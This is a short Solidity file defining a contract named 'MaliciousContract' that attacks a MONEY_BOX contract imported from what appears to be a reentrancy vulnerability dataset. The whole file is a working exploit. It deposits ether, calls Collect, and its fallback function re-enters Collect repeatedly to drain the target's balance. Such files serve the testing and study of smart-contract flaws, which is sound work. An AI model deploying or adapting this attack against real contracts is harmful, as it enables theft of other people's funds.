pragma solidity ^0.4.19;
import "../dataset/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol";

contract MaliciousContract{
    MONEY_BOX money_box;
    

    constructor(address _money_box) public{
        money_box= MONEY_BOX (_money_box);
    }

   function attack(uint amount) public {
        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
        money_box.Collect(amount);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        money_box.Put.value(msg.value)(0);        
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( address(money_box).balance >= 1 ether) {
            money_box.Collect(1 ether);
        }
    }
}
